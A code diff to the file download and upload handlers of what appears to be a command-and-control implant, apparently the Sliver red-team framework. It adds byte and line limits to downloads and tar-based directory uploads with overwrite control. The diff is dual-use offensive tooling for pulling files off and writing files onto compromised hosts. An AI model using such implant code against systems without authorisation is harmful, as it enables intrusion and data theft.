@@ -448,17 +448,77 @@ func pwdHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func prepareDownload(path string, filter string, recurse bool) ([]byte, bool, int, int, error) {
+func prepareDownload(path string, filter string, recurse bool, maxBytes int64, maxLines int64) ([]byte, bool, int, int, error) {
 	/*
 		Combine the path and filter to see if the user wants
 		to download a single file
 	*/
+	var rawData []byte
+	var err error
+
 	fileInfo, err := os.Stat(path + filter)
 
 	if err == nil && !fileInfo.IsDir() {
 		// Then this is a single file
-		rawData, err := os.ReadFile(path + filter)
+		fileHandle, err := os.Open(path + filter)
 		if err != nil {
+			// Then we could not read the file
+			return nil, false, 0, 1, err
+		}
+		defer fileHandle.Close()
+
+		if maxBytes != 0 {
+			var readFirst bool = maxBytes > 0
+			if readFirst {
+				rawData = make([]byte, maxBytes)
+				_, err = fileHandle.Read(rawData)
+			} else {
+				rawData = make([]byte, maxBytes*-1)
+				var bytesToRead int64 = 0
+				if fileInfo.Size()+maxBytes < 0 {
+					bytesToRead = 0
+				} else {
+					bytesToRead = fileInfo.Size() + maxBytes
+				}
+				_, err = fileHandle.ReadAt(rawData, bytesToRead)
+			}
+
+		} else if maxLines != 0 {
+			var linesRead int64 = 0
+			var lines []string
+			var readFirst bool = true
+
+			if maxLines < 0 {
+				maxLines *= -1
+				readFirst = false
+			}
+
+			fileScanner := bufio.NewScanner(fileHandle)
+			for fileScanner.Scan() {
+				lines = append(lines, fileScanner.Text())
+				linesRead += 1
+				if linesRead == maxLines && readFirst {
+					break
+				}
+			}
+			err = fileScanner.Err()
+			if err == nil {
+				if readFirst {
+					rawData = []byte(strings.Join(lines, "\n"))
+				} else {
+					linePosition := int64(len(lines)) - maxLines
+					if linePosition < 0 {
+						linePosition = 0
+					}
+					rawData = []byte(strings.Join(lines[linePosition:], "\n"))
+				}
+			}
+		} else {
+			// Read the entire file
+			rawData = make([]byte, fileInfo.Size())
+			_, err = fileHandle.Read(rawData)
+		}
+		if err != nil && err != io.EOF {
 			// Then we could not read the file
 			return nil, false, 0, 1, err
 		} else {
@@ -498,11 +558,29 @@ func downloadHandler(data []byte, resp RPCResponse) {
 	if pathIsDirectory(target) {
 		// Even if the implant is running on Windows, Go can deal with "/" as a path separator
 		target += "/"
+		if downloadReq.RestrictedToFile {
+			/*
+				The user has asked to perform a download operation that should only be allowed on
+				files, and this is a directory. We should let them know.
+			*/
+			err = fmt.Errorf("cannot complete command because target %s is a directory", target)
+			// {{if .Config.Debug}}
+			log.Printf("error completing download command: %v", err)
+			// {{end}}
+			download = &sliverpb.Download{Path: target, Exists: false, ReadFiles: 0, UnreadableFiles: 0}
+			download.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%v", err),
+			}
+
+			data, _ = proto.Marshal(download)
+			resp(data, err)
+			return
+		}
 	}
 
 	path, filter := determineDirPathFilter(target)
 
-	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse)
+	rawData, isDir, readFiles, unreadableFiles, err := prepareDownload(path, filter, downloadReq.Recurse, downloadReq.MaxBytes, downloadReq.MaxLines)
 
 	if err != nil {
 		if isDir {
@@ -752,6 +830,74 @@ func grepHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+func extractFiles(data []byte, path string, overwrite bool) (int, int, error) {
+	reader := tar.NewReader(bytes.NewReader(data))
+	filesSkipped := 0
+	filesWritten := 0
+
+	for {
+		header, err := reader.Next()
+		switch {
+		case err == io.EOF:
+			// Then we are done
+			return filesWritten, filesSkipped, nil
+		case err != nil:
+			// We should return the up to the caller
+			return filesWritten, filesSkipped, err
+		case header == nil:
+			// Just in case the error is nil, skip it
+			continue
+		}
+		// Validate file path
+		fileName := filepath.Join(path, header.Name)
+		if !strings.HasPrefix(fileName, filepath.Clean(path)+string(os.PathSeparator)) {
+			// Invalid path
+			continue
+		}
+
+		_, err = os.Stat(fileName)
+
+		// Take different actions based on whether this header entry is a directory or a file
+		switch header.Typeflag {
+		case tar.TypeDir:
+			if err != nil {
+				if err := os.MkdirAll(fileName, 0750); err != nil {
+					return filesWritten, filesSkipped, err
+				}
+			}
+		case tar.TypeReg:
+			if err == nil {
+				// Then the file exists
+				if !overwrite {
+					// If we are not overwriting files, then skip this entry
+					filesSkipped += 1
+					continue
+				}
+			}
+
+			// Check to make sure the destination directory exists, and if it does not, create it
+			destinationDir := filepath.Dir(fileName)
+			if _, err = os.Stat(destinationDir); errors.Is(err, fs.ErrNotExist) {
+				if err = os.MkdirAll(destinationDir, 0750); err != nil {
+					return filesWritten, filesSkipped, err
+				}
+			}
+			file, err := os.OpenFile(fileName, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
+			if err != nil {
+				file.Close()
+				return filesWritten, filesSkipped, err
+			}
+
+			if _, err := io.Copy(file, reader); err != nil {
+				file.Close()
+				return filesWritten, filesSkipped, err
+			}
+			file.Close()
+			filesWritten += 1
+		}
+	}
+}
+
 func uploadHandler(data []byte, resp RPCResponse) {
 	uploadReq := &sliverpb.UploadReq{}
 	err := proto.Unmarshal(data, uploadReq)
@@ -769,47 +915,111 @@ func uploadHandler(data []byte, resp RPCResponse) {
 		log.Printf("upload path error: %v", err)
 		// {{end}}
 		resp([]byte{}, err)
+		return
 	}
 
 	// Process Upload
 	upload := &sliverpb.Upload{Path: uploadPath}
 	uploadPathInfo, err := os.Stat(uploadPath)
-	if err != nil && !os.IsNotExist(err) {
+	if err != nil {
+		if !errors.Is(err, fs.ErrNotExist) {
+			upload.Response = &commonpb.Response{
+				Err: fmt.Sprintf("%v", err),
+			}
+		} else if errors.Is(err, fs.ErrNotExist) {
+			if uploadReq.IsDirectory {
+				// We need to make a directory for the files
+				err = os.MkdirAll(uploadPath, 0750)
+				if err != nil && !errors.Is(err, fs.ErrExist) {
+					upload.Response = &commonpb.Response{
+						Err: fmt.Sprintf("%v", err),
+					}
+				}
+			} else {
+				// If the file does not exist, that is fine because we will create it.
+				err = nil
+			}
+		}
+	} else if uploadPathInfo.IsDir() {
+		if !strings.HasSuffix(uploadPath, string(os.PathSeparator)) {
+			uploadPath += string(os.PathSeparator)
+			upload.Path = uploadPath
+		}
+		if !uploadReq.IsDirectory {
+			uploadPath += uploadReq.FileName
+			uploadPathInfo, err = os.Stat(uploadPath)
+			upload.Path = uploadPath
+			// We will deal with any error in a bit.
+			if err != nil && errors.Is(err, fs.ErrNotExist) {
+				// If the file does not exist, that is fine because we will create it.
+				err = nil
+			}
+		}
+	}
+
+	if uploadPathInfo != nil && !uploadPathInfo.IsDir() && !uploadReq.Overwrite {
+		// Then we are trying to overwrite a file that exists and
+		// the overwrite flag was not specified
+		err = fmt.Errorf("%s exists, but the overwrite flag was not set", uploadPath)
 		upload.Response = &commonpb.Response{
 			Err: fmt.Sprintf("%v", err),
 		}
 	}
 
-	if !os.IsNotExist(err) && uploadPathInfo.IsDir() {
-		if !strings.HasSuffix(uploadPath, string(os.PathSeparator)) {
-			uploadPath += string(os.PathSeparator)
-		}
-		uploadPath += uploadReq.FileName
+	// If we have not resolved the error by now, then bail.
+	if err != nil {
+		data, _ = proto.Marshal(upload)
+		resp(data, err)
+		return
 	}
 
-	f, err := os.Create(uploadPath)
+	var uploadData []byte
+
+	if uploadReq.Encoder == "gzip" {
+		uploadData, err = gzipRead(uploadReq.Data)
+	} else {
+		uploadData = uploadReq.Data
+	}
+	// Check for decode errors
 	if err != nil {
 		upload.Response = &commonpb.Response{
 			Err: fmt.Sprintf("%v", err),
 		}
-
 	} else {
-		// Create file, write data to file system
-		defer f.Close()
-		var uploadData []byte
-		var err error
-		if uploadReq.Encoder == "gzip" {
-			uploadData, err = gzipRead(uploadReq.Data)
-		} else {
-			uploadData = uploadReq.Data
-		}
-		// Check for decode errors
-		if err != nil {
-			upload.Response = &commonpb.Response{
-				Err: fmt.Sprintf("%v", err),
+		if uploadReq.IsDirectory {
+			filesWritten, filesSkipped, err := extractFiles(uploadData, uploadPath, uploadReq.Overwrite)
+			if err != nil {
+				writtenQualifer := "s"
+				if filesWritten == 1 {
+					writtenQualifer = ""
+				}
+				skippedQualifier := "s"
+				if filesSkipped == 1 {
+					skippedQualifier = ""
+				}
+				upload.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%d file%s written, %d file%s skipped: %v", filesWritten, writtenQualifer, filesSkipped, skippedQualifier, err),
+				}
+				upload.WrittenFiles = int32(filesWritten)
+				upload.UnwriteableFiles = int32(filesSkipped)
 			}
+			upload.WrittenFiles = int32(filesWritten)
+			upload.UnwriteableFiles = int32(filesSkipped)
 		} else {
-			f.Write(uploadData)
+			f, err := os.Create(uploadPath)
+			if err != nil {
+				upload.Response = &commonpb.Response{
+					Err: fmt.Sprintf("%v", err),
+				}
+				upload.UnwriteableFiles = 1
+				upload.WrittenFiles = 0
+			} else {
+				// Create file, write data to file system
+				f.Write(uploadData)
+				f.Close()
+				upload.WrittenFiles = 1
+				upload.UnwriteableFiles = 0
+			}
 		}
 	}
 
@@ -1041,7 +1251,7 @@ func gzipWrite(w io.Writer, data []byte) error {
 }
 
 func gzipRead(data []byte) ([]byte, error) {
-	bytes.NewReader(data)
+	//bytes.NewReader(data)
 	reader, err := gzip.NewReader(bytes.NewReader(data))
 	if err != nil {
 		return nil, err
